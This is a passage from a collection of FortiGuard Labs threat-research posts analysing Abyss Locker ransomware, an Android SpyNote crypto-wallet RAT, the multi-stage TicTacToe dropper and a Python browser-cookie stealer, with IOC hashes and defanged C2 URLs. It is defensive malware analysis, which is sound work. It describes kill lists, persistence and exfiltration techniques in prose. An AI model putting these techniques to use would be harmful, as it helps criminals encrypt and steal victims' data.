    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Abyss Locker (AbyssLocker) ransomware. Affected platforms:Microsoft Windows, LinuxImpacted parties:Microsoft Windows and Linux UsersImpact:Steals and encrypts victims' files and demands ransom for file decryption and not releasing the stolen data.Severity level:High Although the first Abyss Locker sample was submitted to a publicly available file scanning service in July of 2023, the first variant of the ransomware may date back further as the ransomware is based on the HelloKitty ransomware source code. A version 1 variant of the Abyss Locker ransomware targeting Windows systems was discovered in early January 2024, followed by version 2 for Windows later that month. (We were unable to locate version 1 for Linux.) We review both the Linux and Windows variants in this week’s roundup. The Abyss Locker threat actor steals victims' data before deploying and running its ransomware malware for file encryption. The ransomware is also capable of deleting Volume Shadow Copies and system backups. Information on the infection vector used by the Abyss Locker ransomware threat actor is unavailable. However, it is not likely to differ significantly from other ransomware groups. The Abyss Locker ransomware samples were submitted to a publicly available file scanning service from a variety of regions, including Europe, North America, South America, and Asia. The Windows version of the Abyss Locker ransomware version 1 performs the following actions: It stops the following services: MSSQLServerADHelper100 MSSQL$ISARS MSSQL$MSFW SQLAgent$ISARS SQLAgent$MSFW SQLBrowser ReportServer$ISARS SQLWriter WinDefend mr2kserv MSExchangeADTopology MSExchangeFBA MSExchangeIS MSExchangeSA ShadowProtectSvc SPAdminV4 SPTimerV4 SPTraceV4 SPUserCodeV4 SPWriterV4 SPSearch4 IISADMIN firebirdguardiandefaultinstance ibmiasrw QBCFMonitorService QBVSS QBPOSDBServiceV12 IBM Domino Server (CProgramFilesIBMDominodata) IBM Domino Diagnostics (CProgramFilesIBMDomino) Simply Accounting Database Connection Manager QuickBooksDB1 QuickBooksDB2 QuickBooksDB3 QuickBooksDB4 QuickBooksDB5wrapper DefWatch ccEvtMgr ccSetMgr SavRoam Sqlservr sqlagent sqladhlp Culserver RTVscan sqlbrowser SQLADHLP QBIDPService Intuit.QuickBooks.FCS msmdsrv tomcat6 zhudongfangyu vmware - usbarbitator64 vmware - converter dbsrv12 dbeng8 MSSQL$MICROSOFT##WID MSSQL$VEEAMSQL2012 SQLAgent$VEEAMSQL2012 FishbowlMySQ MySQL57 MSSQL$KAV_CS_ADMIN_KIT SQLAgent$KAV_CS_ADMIN_KIT msftesql - Exchange MSSQL$MICROSOFT##SSEE MSSQL$SBSMONITORING MSSQL$SHAREPOINT MSSQLFDLauncher$SBSMONITORING MSSQLFDLauncher$SHAREPOINT SQLAgent$SBSMONITORING SQLAgent$SHAREPOINT QBFCService YooBackup YooIT svc$ MSSQL MSSQL$ memtas mepocs sophos veeam backup bedbg PDVFSService BackupExecVSSProvider BackupExecAgentAccelerator BackupExecAgentBrowser BackupExecDiveciMediaService BackupExecJobEngine BackupExecManagementService BackupExecRPCService MVArmor MVarmor64 stc_raw_agent VSNAPVSS VeeamTransportSvc VeeamDeploymentService VeeamNFSSvc AcronisAgent ARSM AcrSch2Svc CASAD2DWebSvc CAARCUpdateSvc WSBExchange MSExchange MSExchange$ GxVss GxBlr GxFWD GxCVD GxCIMgr It then terminates the following processes: 360doctor.exe 360se.exe ADExplorer.exe ADExplorer64.exe ADExplorer64a.exe Adobe CEF.exe Adobe Desktop Service.exe AdobeCollabSync.exe AdobeIPCBroker.exe AutodeskDesktopApp.exe Autoruns.exe Autoruns64.exe Autoruns64a.exe Autorunsc.exe Autorunsc64.exe Autorunsc64a.exe AvastUI.exe BrCcUxSys.exe BrCtrlCntr.exe CNTAoSMgr.exe CagService.exe CoreSync.exe Creative Cloud.exe Culture.exe Defwatch.exe DellSystemDetect.exe EnterpriseClient.exe GDscan.exe GWCtlSrv.exe GlassWire.exe Helper.exe InputPersonalization.exe MsDtSrvr.exe MsDtsSrvr.exe MsMpEng.exe ONENOTEM.exe PccNTMon.exe ProcessHacker.exe Procexp.exe Procexp64.exe QBDBMgr.exe QBDBMgrN.exe QBIDPService.exe QBW32.exe RAgui.exe RTVscan.exe Raccine.exe RaccineElevatedCfg.exe RaccineSettings.exe Raccine_x86.exe RdrCEF.exe ReportingServicesService.exe SQLAGENT.EXE Simply.SystemTrayIcon.exe SimplyConnectionManager.exe Sqlservr.exe, Ssms.exe Sysmon.exe Sysmon64.exe SystemExplorer.exe SystemExplorerService.exe SystemExplorerService64.exe TMBMSRV.exe TeamViewer.exe TeamViewer_Service.exe TitanV, Ssms.exe TmCCSF.exe TmListen.exe TmPfw.exe TmProxy.exe Totalcmd.exe Totalcmd64.exe VeeamDeploymentSvc.exe WRSA.exe WireShark.exe ZhuDongFangYu.exe acwebbrowser.exe agntsvc.exe avp.exe avz.exe axlbridge.exe bedbh.exe benetns.exe bengien.exe beserver.exe dbeng50.exe dbsnmp.exe dumpcap.exe egui.exe encsvc.exe excel.exe fbguard.exe fbserver.exe fdhost.exe fdlauncher.exe firefox.exe httpd.exe infopath.exe isqlplussvc.exe j0gnjko1.exe java.exe msaccess.exe msftesql.exe msmdsrv.exe mspub.exe mydesktopqos.exe mydesktopservice.exe mysqld.exe node.exe notepad++.exe notepad.exe ntrtscan.exe ocautoupds.exe ocomm.exe ocssd.exe onenote.exe oracle.exe outlook.exe pg_ctl.exe postgres.exe powerpnt.exe procexp64a.exe mon.exe proc, procmon64.exe procmon64a.exe pvlsvr.exe qbupdate.exe raw_agent_svc.exe sam.exe sqbcoreservice.exe sql.exe sqlbrowser.exe sqlceip.exe sqlmangr.exe sqlservr.exe sqlwriter.exe steam.exe supervise.exe synctime.exe tbirdconfig.exe tcpview.exe tcpview64.exe tcpview64a.exe tdsskiller.exe thebat.exe thunderbird.exe tomcat6.exe tv_w32.exe tv_x64.exe visio.exe vsnapvss.exe vxmon.exe wdswfsafe.exe winword.exe wordpad.exe wsa_service.exe wxServer.exe wxServerView.exe xfssvccon.exe The ransomware uses the following commands to delete Volume Shadow Copies: It runs the following commands to set the boot status policy: The Abyss Locker ransomware encrypts files on compromised machines and adds a “.abyss” extension to the encrypted files. The Abyss Locker version 1 variant for Windows adds a random five-letter extension instead of “.abyss.” The ransomware drops a ransom note labeled “WhatHappened.txt.” The TOR site used for ransom negotiations was not accessible at the time of our investigation. It then replaces the desktop wallpaper with its own, which contains a ransom message: However, the following file encryption exception applies to the Abyss Locker ransomware: It skips encrypting files with the following extensions: .Abyss .386 .cmd .ani .adv .msi .msp .com .nls .ocx .mpa .cpl .mod .hta .prf .rtp .rpd .bin .hlp .shs .drv .wpx .bat .rom .msc .spl .msu .ics .key .exe .dllv .lnk .icov .sys .cur .idx .ini .reg .mp3 .mp4 .apk .ttf .otf .fon .fnt .dmp .tmp .pif .wav .wma .dmg .iso .app .ipa .xex .wad .icns .lock .theme .diagcfg .blf .diagcab .diagpkg .msstyles .gadget .woff .part .sfcache .winmd It also skips encrypting the following files: work.log autorun.inf boot.ini bootfont.bin bootsect.bak bootmgr bootmgr.efi bootmgfw.efi desktop.ini iconcache.db ntldr ntuser dat ntuser.dat.log ntuser.ini thumbs.db !CryptoLockerDetectionDONT-DELETE!.jpg WhatHappened.txt In addition, it avoids encrypting files in the following folders: Boot Windows Windows.old $Windows.~bt $windows.~ws windows nt msbuild microsoft perflog Microsoft – Cloud Computers Apps & Gaming microsoft shared common files windows defender windowspowershell windows security usoshared windowsapp windows journal windows photo viewer $Recycle.Bin All Users Program Files Program Files (x86) system volume information msocache Tor Browser Internet Explorer Google Opera Opera Software Mozilla Mozilla Firefox #recycle Our analysis of Abyss Locker ransomware version 2, which appeared in late January 2024, found no differences from version 1 in terms of functionality. The only differences we could find are the ransom message (including the message on the replaced wallpaper), which clearly states that it's version 2, and the TOR address used for ransom negotiation. The TOR site used by this version of Abyss Locker ransomware for ransom negotiation was still accessible at the time of our investigation. This ransomware variant runs the following run commands: The ransomware then encrypts files on the compromised machines and adds a “.crypt” extension to the encrypted files. It then creates files with a “.README_TO_RESTORE” extension, which is a ransom note. It avoids encrypting files in the following directories: /boot /dev /etc /lost+found /proc /run /usr/bin /usr/include /usr/lib /usr/lib32 /usr/lib64 /usr/sbin /sys /usr/libexec /usr/share /var/lib It also avoids encrypting files with the following extensions: .vmdk .vmsd .vmsn .crypt .README_TO_RESTORE .tmp .a .so .la Currently, the Abyss Locker ransomware threat actor does not appear to have a TOR site that exposes the victim's name and allows others to view the stolen data, although BleepingComputer previouslyreportedsuch a leak site in mid-2023. However, the threat actor does offer a ransom negotiation site on TOR. The ransom is set low for businesses and high for consumers ($282,380 in this case), making it difficult to determine who is being targeted. The Abyss Locker ransomware described in this report are detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. Abyss Locker Ransomware File IOCs SHA2 Note 72310e31280b7e90ebc9a32cb33674060a3587663c0334daef76c2ae2cc2a462 Abyss Locker v2 (Linux) 3fd080ef4cc5fbf8bf0e8736af00af973d5e41c105b4cd69522a0a3c34c96b6d Abyss Locker v2 (Windows) 9243bdcbe30fbd430a841a623e9e1bcc894e4fdc136d46e702a94dad4b10dfdc Abyss Locker v1 (Windows) 0763e887924f6c7afad58e7675ecfe34ab615f4bd8f569759b1c33f0b6d08c64 Abyss Locker v1 (Windows) dee2af08e1f5bb89e7bad79fae5c39c71ff089083d65da1c03c7a4c051fabae0 Abyss Locker v1 (Windows) e6537d30d66727c5a306dc291f02ceb9d2b48bffe89dd5eff7aa2d22e28b6d7c Abyss Locker v1 (Windows) 1d04d9a8eeed0e1371afed06dcc7300c7b8ca341fe2d4d777191a26dabac3596 Abyss Locker v1 (Windows) 1a31b8e23ccc7933c442d88523210c89cebd2c199d9ebb88b3d16eacbefe4120 Abyss Locker v1 (Windows) 25ce2fec4cd164a93dee5d00ab547ebe47a4b713cced567ab9aca4a7080afcb7 Abyss Locker v1 (Windows) b524773160f3cb3bfb96e7704ef31a986a179395d40a578edce8257862cafe5f Abyss Locker v1 (Windows) 362a16c5e86f13700bdf2d58f6c0ab26e289b6a5c10ad2769f3412ec0b2da711 Abyss Locker v1 (Windows) e5417c7a24aa6f952170e9dfcfdf044c2a7259a03a7683c3ddb72512ad0cd5c7 Abyss Locker v1 (Windows) 056220ff4204783d8cc8e596b3fc463a2e6b130db08ec923f17c9a78aa2032da Abyss Locker v1 (Windows) 877c8a1c391e21727b2cdb2f87c7b0b37fb7be1d8dd2d941f5c20b30eb65ee97 Abyss Locker v1 (Windows) 2e42b9ded573e97c095e45dad0bdd2a2d6a0a99e4f7242695054217e2bba6829 Abyss Locker v1 (Windows) Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS based Digital Risk Prevention Service backed by cybersecurity experts to provide unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP)is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation. Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-abyss-locker"
  },
  {
    "title": "Android/SpyNote Moves to Crypto Currencies",
    "content": "FortiGuard Labs Threat Research Affected Platform:AndroidImpacted Users:Android users with mobile crypto wallet or banking applicationsImpact:Financial LossSeverity Level:Medium Spynoteis a Remote Access Trojan that initially surfaced in 2020. Since then, it has grown into one of the most common families of malware for Android, with multiple samples, integration of other RATs (e.g. CypherRat), and a large family of over 10,000 samples. There are multiple variants and integrations of other RATs, and since 2023 there has been agrowing interestinfinancial institutions. On February 1st, we found a malicious sample posing as a legitimate crypto wallet that actually included the SpyNote RAT with several interesting additions related to anti-analysis andcryptocurrencies. Like much Android malware today, this malware abuses theAccessibility API. This API is used to automatically perform UI actions. For example, the malicious sample uses the Accessibility API to record device unlocking gestures. Newer, this SpyNote sample uses the Accessibility API to target famous crypto wallets. The following code recognizes the use of a legitimatecrypto walletand displays anoverlayover it. The injected overlay consists of a WebView whose HTML is hard-coded in Base64. If we decode the overlay, we get anHTML page for cryptocurrency transfers. Notice that the page apparently initiates a transfer between 2 hard-coded fake wallets. See below: the “…” in between the alleged wallet addresses are exactly as in the code (note that we censored the full addresses). For the malware analyst, it’s obvious they are fake.  However, it is likely the victim won’t notice because (1) the wallet identifiers always have many characters and are therefore difficult to verify, and (2) this will look as if it were displayed by the victim’s legit crypto wallet application (in reality, it is displayedoverthe real crypto wallet app, but this is not detectable). In addition, the malicious code uses the Accessibility API toautomatically fill a form and transfer a given amount of cryptocurrency to the cybercriminals. Precisely, the code performs the following tasks: All of these operations are performedautomaticallythrough the Accessibility APIwithout the user’s intervention. To gain access to the Accessibility API, all malware lure victims one way or another into giving them the necessary rights. This sample follows the same strategy. We remind end-users that they should never do this. While the Accessibility API is rightfully requested by apps to help people with disabilities, they should always be treated as highly suspicious coming from alleged crypto wallets, PDF Readers, Video Players, etc. The 2 screenshots below show (1) the SpyNote malware requesting Accessibility Service and (2) how, when you grant the desired access, the Android OS displays an additional warning window explaining the risks. It is still possible at that point to click on “Deny,” and the malware won’t gain access. Unfortunately, as soon as the victim clicks on “Allow,” it is basically “game over” because the malware can navigate, click, read, and modify any application. Besides injections into crypto wallets, the sample features an interesting, simple, but efficient anti-analysis technique. We remind users that Android Packages (APK) areZIPfiles and normally contain a Dalvik executable (classes.dex), a manifest (AndroidManifest.xml), resources, and assets. In this particular case, the sample ismalformatted: several resource files are meant to be present in the subdirectories of classes.dex and AndroidManifest.xml. But classes.dex and AndroidManifest.xml arefiles, notdirectories. Consequently, standard unzip tools fail with lots of errors, which complicates the automated analysis of the sample. After a growing interest in financial institutions,this new Android/SpyNote sample shows that malware authors are now taking into account cryptocurrencies.The capabilities of the malware are well beyond the mere spying of credentials as they can initiate cryptocurrency transfers. As for anti-analysis,while the implemented technique is simple and by-passable by a human analyst, it certainly defeats—or complicates—automated analysis, giving the malware author a little more time before detection. The sample is detected automatically by our products, and we urge Android users to pay particular attention to any application requesting the Accessibility API. Fortinet customers are already protected from this malware variant through our AntiVirus as follows: FortiGuard Labs detects the sample with the following AV signatures: Android/SpyNote.F!tr TheFortiGuard AntiVirus serviceis supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. File Hash Detection Imtoken.apk SHA1:8eea235b26fadeecd0f817433c97747853c51a24SHA256:caac4681389b0af7998ba8fd2062d18050a0e5e8cb4c8d0006a1b3a921ee52c8 Android/SpyNote.F!tr crypto,spyware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/android-spynote-moves-to-crypto-currencies"
  },
  {
    "title": "TicTacToe Dropper",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft Windows UsersImpact:This loader has been used to load multiple RATs and info stealers, which can lead to compromised credentials and enable further malicious activitiesSeverity Level:Medium While analyzing malware samples collected from several victims, the FortiGuard team identified a grouping of malware droppers used to deliver various final-stage payloads throughout 2023. Malware droppers are malicious software designed to deliver and execute additional malware on a victim system and are employed to obfuscate final payloads during load and initial execution. Droppers within this group employ multiple stages of obfuscated payloads loading reflectively in memory. Some of the final stage payloads we identified include Leonem, AgentTesla, SnakeLogger, RemLoader, Sabsik, LokiBot, Taskun, Androm, Upatre, and Remcos. We have named this group of payloads ‘TicTacToe dropper’ due to a common Polish language string, ‘Kolko_i_krzyzyk,’ found in multiple earlier samples of the dropper, which translates to TicTacToe in English. While not all versions of this group of droppers contain this string, commonalities in their behavior led us to this grouping. We analyzed multiple samples of this dropper. The executable malware file was usually delivered through an .iso file. From cases directly observed in the wild, these iso files were delivered to the victim via phishing as an attachment (T1566.001). This technique of packing malware inside an iso file is typically employed to avoid detection by antivirus software and as a mark-of-the-web (MOTW) bypass technique (T1553.005). The executable inside the iso had multiple layers of DLL files, which were extracted at runtime and loaded directly into memory. One layer of DLL was decoded at runtime, and the next layer of DLL was loaded and decoded by the previous layer of the DLL file. We will discuss the extraction of these obfuscated payloads in a later section. The extraction process is convoluted, so the diagram below should be referenced alongside the analysis to better understand the behavior of the dropper. We found that the same dropper has been used to distribute multiple final-stage remote access tools (RATs) for at least the last 12 months. This is shown in the following timeline diagram: To better understand the TicTacToe dropper, we performed static and dynamic analysis on several samples. The first TicTacToe dropper sample analyzed is a 32-bit executable developed in the .NET programming language called ‘ALco.exe’ (SHA-1 b6914b8fa3d0b67eb6173123652b7f0682cd24fb). Analysis of the sample identified that, on execution, the dropper extracts and loads a .NET PE DLL file directly into its current process using a runtime assembly object. This means the file is loaded directly into memory without being written to disk. The code associated with this in-memory loading can be seen in Figure 3. We then extracted the DLL at runtime and saved it as a separate file. This extracted DLL file was named ‘Hadval.dll’ in the OriginalFileName field in the file's version information. In this article, we will call this file ‘Hadval.dll’ or ‘stage2 payload’ for reference. This Hadval.dll file is a 32-bit .NET PE DLL file. This DLL file was obfuscated with version 4.1 of the DeepSea software, which differs from what was used to obfuscate the main executable (as yet undetermined). The DeepSea obfuscation resulted in unreadable function names and clear indicators of code flow obfuscation, as shown in Figure 2. Thede4dot toolwas used to subvert some of the DeepSea obfuscation. The de4dot tool is an open source (GPLv3) .NET de-obfuscator and unpacker written in C# that can often be used to restore a packed and obfuscated assembly to almost the original assembly. The de4dot tool detected that the file was obfuscated using the tool DeepSea 4.1 and then de-obfuscated much of the library to provide a cleaner version of the Hadval.dll file. We can see the output of the de4dot tool execution in Figure 5 and some of the cleaner, more readable code in Figure 6. Performing further debugging of the ‘ALco.exe’ process, we identified that the Hadval.dll code is used to extract a gzip blob. Decompressed, this gzip blob revealed another 32-bit PE DLL file and another .NET library. This stage 3 payload has the internal file name ‘cruiser.dll.’ This cruiser.dll was protected by software calledSmartAssembly, which is software provided by Redgate to protect .NET code from reverse engineering. This software claims to protect the source code of .NET applications through obfuscation and encryption and is designed to prevent intellectual property theft through code analysis. The tool ‘Detect It Easy’ shows this information, as seen in Figure 7. This cruiser.dll file was de-obfuscated using the de4dot tool to create a cleaned version of the binary DLL file. Following this de-obfuscation, we can see that the cruiser.dll file has a class named ‘Munoz.’ This class contains a function that creates a copy of the executable in the temp folder. This payload matches the description of a payload with the same name, ‘cruiser.dll,’ as described in Jai Minton's blog, where he analyzed it. We can see the code from the cleaned cruiser.dll file in Figure 8, including the ‘Munoz’ class. The code from the stage 3 DLL file (cruiser.dll) extracts, reflectively loads, and executes the stage 4 payload from the bitmap object ‘dZAu’ (a resource from the main payload). The stage 4 payload is another .NET PE DLL file with the internal name 'Farinell2.dll.’ It is obfuscated with a custom obfuscator. This stage 4 payload (Farinell2.dll) then de-obfuscates, reflectively loads, and executes the final payload. We have seen multiple variants of this dropper with different types of final payloads (e.g., Lokibot to gain credentials from numerous browsers and software in the victim machine, Remcos for remote access, etc.) Analyzing another TicTacToe dropper allows us to document some common characteristics within the malware group. This executable (SHA1: 15b3c9768a67ce0d09807627f1939c7165a3fede) was also a 32-bit .NET executable with the internal name ‘IxOQ.exe.’ This executable was not obfuscated but shares similarities with the above variant, i.e., later-stage obfuscated payloads embedded as object resources. This can be seen in the screenshot in Figure 9. The resource object has stored hexadecimal numbers as strings. A simple obfuscation was used while storing, which was to replace ‘0’ (zero) with ‘ZZ’ and replace ‘F’ with ‘YY.’ When the object string was being loaded, this string replacement was reversed to get the original hexadecimal string. This string was then converted to bytes and loaded as assembly code using the ‘Assembly.Load’ method. The resource object contents can be seen in Figure 10. When this string was de-obfuscated and extracted, it was found to be a 32-bit .NET PE DLL file like the previous sample. This stage 2 payload had the internal name of ‘Pendulum.dll.’ When the code inside ‘Pendulum.dll’ is executed, it extracts a stage 3 payload named ‘cruiser.dll.’ This is the same file name as the stage 3 payload DLL of the previous sample and uses the same loading process. This cruiser.dll extracts the stage 4 payload from the bitmap object ‘JqZn,’ a resource in the primary executable ‘lxOQ.exe.’ This and the previous sample executable files present similarly obfuscated image objects. These bitmap objects are visually similar between samples, as shown in Figure 11, where this and the last sample are compared. The payload extracted from the bitmap object was found to be another 32-bit .NET PE DLL file. This DLL file has the internal name of ‘Discompard.dll’. The code from this payload was also loaded reflectively, as in previous stage payloads. Multiple antivirus engines recognized this final payload (Discompard.dll) as the ‘Zusy Banking Trojan’ or ‘Leonem’. This ‘Zusy Trojan’ isalso known as‘TinyBanker’ or ‘Tinba’ by some researchers. We performed an analysis of another separate TicTacToe dropper sample, which drops AgentTesla malware. This executable (SHA1: af14b44a1bdbf96b8fec28236f152d410c91e807) was also a 32-bit .NET executable and also employs an identical technique to load code stored in the resource element of the file. This can be seen in Figure 12. When the resource object was checked, it was very similar to the resource object in the previous sample. It had stored hexadecimal numbers as strings, and the code used to obfuscate it was also similar, replacing ‘0’ (zero) with ‘ZZ’ and substituting ‘F’ with ‘YY.’ This is shown in Figure 13. The stage 2 payload has the internal name ‘Pendulum.dll,’ and the stage 3 payload has the name ‘cruiser.dll.’ On execution, the stage 3 payload extracts the stage 4 payload from the bitmap object ‘faLa.’ Again, the visual aspects of this embedded bitmap object match those discussed in the previous two samples. This can be seen in Figure 14. The final payload in this sample was detected as AgentTesla, a well-known RAT. In our search for any reporting on this dropper, we identified amalware analysis reportfrom Jai Minton. The second malware sample we analyzed had the same names as the payload DLL files, also as mentioned in Jai Minton’s blog. The only slight change was that the stage 2 payload was ‘Pend.dll’ in his analyzed sample, and in the second sample analyzed above, it was ‘Pendulum.dll.’ Names of other intermediate payloads (Cruiser.dll and Discompard.dll) match the payloads analyzed in Jai’s blog. In addition to these naming similarities, the dropper behavior exhibited by the sample outlined in Jai’s analysis is identical and results in the loading and execution of a Remcos executable. We analyzed multiple common characteristics in the different TicTacToe dropper samples. Here are some common characteristics: This dropper delivers multiple types of final payloads. As a result, we do not believe a single threat actor group uses this dropper. Instead, it is used as a tool that may be sold as a service to threat actors. We discovered that samples distributed at the beginning of 2023 contained the strings TicTacToe (Kolko_i_krzyzyk). Later campaigns had different unique strings common across the same campaigns but distributed different final-stage payloads. Some of the strings include: ‘MatrixEqualityTestDetail,’ ‘QuanLyCafe,’ ‘Pizza_Project,’ ‘Kakurasu,’ ‘BanHang_1’, ‘ChiuMartSAIS,’ etc. This indicates that the dropper tool is in constant development, and developers are trying to evade the string-based analysis of their malware dropper. By understanding the operation of this dropper and implementing solutions that can prevent its execution, organizations will be able to prevent the execution of a variety of final-stage payloads before they can be loaded. Since each iteration of the dropper contains a different final payload, each would have a different hash. As a result, while hash-based detections are still effective at mitigating known campaigns that employ this loader, a behavior-based endpoint security tool is required to detect new campaigns due to the dynamic nature of this malware. Multistage payload extraction and in-memory execution behaviors exhibited by this dropper are anomalous compared to normal application execution, and this type of behavior should be detected and blocked by EDR technology such as FortiEDR. The behavior discussed in this article outlines the behavior of the dropper component of analyzed samples rather than the final payload. Additional samples related to previous known campaigns involving this dropper can be found in VirusTotal by searching for ‘fortinet:MSIL/Kryptik.AIJY!tr OR fortinet:MSIL/GenKryptik.GLXZ!tr OR fortinet:MSIL/GenKryptik.GCRZ!tr’ or by browsing the public collection here:https://www.virustotal.com/gui/collection/a5a5b60edcbbb203cb1965b1d544b74c47284e015ffd50312de0a251141bfbd7/iocs. As highlighted above, the loader described in this report is used to deploy a variety of final payloads. Each of these final payloads is typically tracked byFortiGuard Antivirusseparately, but all instances of this loader can be tracked through the following trackers: MSIL/Kryptik.AIJY!trMSIL/GenKryptik.GLXZ!trMSIL/GenKryptik.GCRZ!tr FortiEDRblocks the reflective loading behavior of this loader, preventing it from loading its final-stage payload. FortiEDR is also able to extract in-memory loaded artifacts to assist with triaging an infection by this dropper. We also suggest that organizations go through Fortinet’s freeFortinet Certified Fundamentals (FCF)in cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. If you believe this or any other cybersecurity threat has impacted your organization, please contact our GlobalFortiGuard Incident Response Team. Indicator Description Indicator Indicator Type Notes First Observed Malicious Executable b6914b8fa3d0b67eb6173123652b7f0682cd24fb SHA1 Hash Dropper executable variant with final payload Lokibot 2023-04-06 Malicious Executable 90624ba95243c7ec20730a101cad6966e75df675 SHA1 Hash Dropper executable variant final payload Warzone RAT 2023-04-12 Malicious Executable 4a5b3465ef2298392b60ec78da233287185eb7dd SHA1 Hash Dropper executable variant with final payload Trojan Mamut 2023-04-12 Malicious Executable 15b3c9768a67ce0d09807627f1939c7165a3fede SHA1 Hash Dropper executable variant with final payload Taskun malware 2023-04-12 Malicious Executable af14b44a1bdbf96b8fec28236f152d410c91e807 SHA1 Hash Dropper executable variant with final payload AgentTesla malware 2023-04-12 Malicious Executable 69dfa8c16879ab1c6c3bb738619dabe9660f2376cb15051ce55e465680e4f67f SHA256 Hash Dropper executable variant with final payload Lokibot 2023-04-06 Malicious Executable 3af5c0843b016faa6129e40b696565d4117b48fd6750164ac4a0f307ef3d6a36 SHA256 Hash Dropper executable variant final payload Warzone RAT 2023-04-12 Malicious Executable 8fe52481cdabec8900f78cab1d673dbb1bde3366d9347a89c2ea8e2e74ab01b4 SHA256 Hash Dropper executable variant with final payload Trojan Mamut 2023-04-12 Malicious Executable 0239bc35516d6d3680c64f7a5a5a40801c7b0ea4db8a80718e4774687c565af3 SHA256 Hash Dropper executable variant with final payload Taskun malware 2023-04-12 Malicious Executable 349fada4859b8ffa4c690af723daa16669d6fa2b9f5ec51111adee2e8cb63748 SHA256 Hash Dropper executable variant with final payload AgentTesla malware 2023-04-12 C2 URL http[:]//64.227.48[.]212/project/five/fre.php URL C2 contacted by final payload 2023-11-27 C2 URL http[:]//171.22.30[.]147/tony/five/fre.php URL C2 contacted by final payload 2023-04-13 Info stealer FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/tictactoe-dropper"
  },
  {
    "title": "Python Info-stealer Distributed by Malicious Excel Document",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High In January 2024, FortiGuard Labs obtained an Excel document distributing an info-stealer. From the fingerprints in this attack, it is related to a Vietnamese-based group that wasfirst reportedon in August 2023 andagainin September. The attack stages before the info-stealer are simple downloaders that increase the difficulty of detection. This article introduces each stage in this attack and provides a glimpse into the world behind the malware campaign. The first stage of this attack is an Excel document with a VBA script that executes a PowerShell command to download a Windows Update.bat from filebin.net. Figure 3 is a screenshot of the Windows Update.bat, protected by the Abobus obfuscator. Obfuscations such as variables whose names contain non-English characters and “^” escape characters are inserted into the original code. Additionally, variable expansions (%variable:~start,length% )were used to replace the alphabet in the original code. Figure 4 is the malicious part of the original code, which downloads and executes test.vbs in the next stage. Test.vbs is roughly the same as the middle stage of the campaign reported in August 2023. It downloads three files: script.py Information stealer. Document.zip Python 3.11 with libraries for script.py. bypass.vbs Executes script.py with the downloaded Python. Script.py is obfuscated by PyObfuscate, which means it needs extra modules to be executed properly. Document.zip is downloaded to solve this problem. In addition, test.vbs creates a value named “WinUpdater” within the registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run to automatically run bypass.vbs when the victim logs in. Unlike the info-stealer described in the August 2023 report, script.py only collects browsers' cookies and login data. It extracts data from a wide range of browsers, from familiar browsers such as Chrome and Edge to browsers focused on the local market, like the Cốc Cốc browser. The collected data is compressed into a zip file, which will be sent to the attacker’s telegram bot with a message containing the date, victim’s country, IP address, language, password 